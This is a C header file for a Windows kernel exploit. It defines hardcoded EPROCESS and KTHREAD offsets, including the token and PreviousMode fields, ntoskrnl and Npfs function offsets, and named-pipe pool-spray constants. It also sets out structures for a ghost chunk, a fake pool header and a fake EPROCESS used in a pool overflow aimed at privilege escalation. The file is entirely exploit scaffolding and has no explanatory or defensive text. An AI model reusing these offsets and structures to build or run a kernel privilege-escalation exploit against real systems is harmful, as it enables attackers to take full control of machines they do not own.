#ifndef COMMON_H
#define COMMON_H

#include <windows.h>

#define SYSTEM_PID 0x4

// Kernel structure offsets
#define EPROCESS_KTHREAD_OFFSET 0x30
#define EPROCESS_UNIQUE_PROCESS_ID_OFFSET 0x440
#define EPROCESS_ACTIVE_PROCESS_LINKS_OFFSET 0x448
#define EPROCESS_TOKEN_OFFSET 0x4B8
#define EPROCESS_QUOTA_BLOCK_OFFSET 0x568
#define KTHREAD_PREVIOUS_MODE_OFFSET 0x232
#define KTHREAD_THREAD_LIST_ENTRY 0x2F8

// Kernel function and variable offsets
#define nt_PsInitialSystemProcess_OFFSET 0xCFC420
#define nt_ExAllocatePoolWithTag_OFFSET 0x9B7010
#define nt_ExpPoolQuotaCookie_OFFSET 0xCFC9E8
#define nt_RtlpHpHeapGlobals_OFFSET 0xC1DCC0
#define Npfs_NpFsdCreate_OFFSET 0xB540
#define Npfs_imp_nt_ExAllocatePoolWithTag_OFFSET 0x7050

// Pipe structure constants
#define LEN_OF_PIPE_QUEUE_ENTRY_STRUCT 0x30
#define STRUCT_HEADER_SIZE LEN_OF_PIPE_QUEUE_ENTRY_STRUCT
#define ROOT_PIPE_ATTRIBUTE_OFFSET 0x140
#define ROOT_PIPE_QUEUE_ENTRY_OFFSET 0x48
#define FILE_OBJECT_OFFSET 0x30
#define FAKE_EPROCESS_SIZE 0x640
#define FAKE_EPROCESS_OFFSET 0x50

// Exploitation constants
#define EXPECTED_TAG 0x7246704E // 'NpFR' in little-endian
#define TARGETED_VULN_SIZE 0x200
#define GHOST_CHUNK_SIZE 0x360
#define GHOST_CHUNK_BUFSIZE GHOST_CHUNK_SIZE - STRUCT_HEADER_SIZE
#define OFFSET_TO_POOL_HEADER 0x10
#define BACKWARD_STEP (TARGETED_VULN_SIZE - ((STRUCT_HEADER_SIZE + 0xf) & (~0xF)))
#define GHOST_CHUNK_OFFSET (TARGETED_VULN_SIZE + OFFSET_TO_POOL_HEADER - BACKWARD_STEP - STRUCT_HEADER_SIZE)

// PipeAttribute name constants
#define ATTRIBUTE_NAME "Z"
#define ATTRIBUTE_NAME_LEN sizeof(ATTRIBUTE_NAME)
#define DUMB_ATTRIBUTE_NAME "DUMB"
#define DUMB_ATTRIBUTE_NAME_LEN sizeof(DUMB_ATTRIBUTE_NAME)

// Spray constants
#define SPRAY_SIZE 0x80 * 10

// Pool Header
#define POOL_HEADER_SIZE 0x10
#define PREV_CHUNK_OFFSET 0x50
#define NEXT_CHUNK_OFFSET 0x3F0

// Exploit structures
typedef struct pipe_attribute
{
    LIST_ENTRY list;
    char* AttributeName;
    uint64_t ValueSize;
    char* AttributeValue;
    char data[0];
} pipe_attribute_t;

typedef struct pipe_queue_entry
{
    LIST_ENTRY list;
    uintptr_t linkedIRP;
    uintptr_t SecurityClientContext;
    unsigned long isDataInKernel;
    unsigned long remaining_bytes;
    unsigned long DataSize;
    unsigned long field_2C;
    char data[0];
} pipe_queue_entry_t;

typedef struct pipe_queue_entry_sub
{
    uint64_t unk;
    uint64_t unk1;
    uint64_t unk2;
    uint64_t data_ptr;
} pipe_queue_entry_sub_t;

typedef struct _HEAP_VS_CHUNK_HEADER
{
    uint16_t MemoryCost;
    uint16_t UnsafeSize;
    uint16_t UnsafePrevSize;
    uint8_t Allocated;
    uint8_t Unused;
    uint8_t EncodedSegmentPageOffset;
} HEAP_VS_CHUNK_HEADER;

typedef struct pipe_pair
{
    HANDLE write;
    HANDLE read;
} pipe_pair_t;

typedef struct pipe_spray
{
    size_t nb;
    size_t bufsize;
    char* data_buf;
    pipe_pair_t pipes[1];
} pipe_spray_t;

typedef struct lookaside
{
    size_t size;
    pipe_spray_t* first;
    pipe_spray_t* second;
    pipe_spray_t* drain;
    char* buf;
} lookaside_t;

typedef struct exploit_pipes
{
    pipe_pair_t* ghost_pipe;
    pipe_pair_t* previous_pipe;
    pipe_spray_t* fake_pool_header;
} exploit_pipes_t;

typedef struct exploit_addresses
{
    uintptr_t kernel_base;
    uintptr_t ExpPoolQuotaCookie;
    uintptr_t RtlpHpHeapGlobals;

    uintptr_t self_kthread;
    uintptr_t self_eprocess;

    uintptr_t ghost_chunk;
    uintptr_t leak_root_queue;
    uintptr_t leak_root_attribute;
    uintptr_t fake_eprocess;
    uintptr_t vs_sub_segment;
} exploit_addresses_t;

#endif // COMMON_H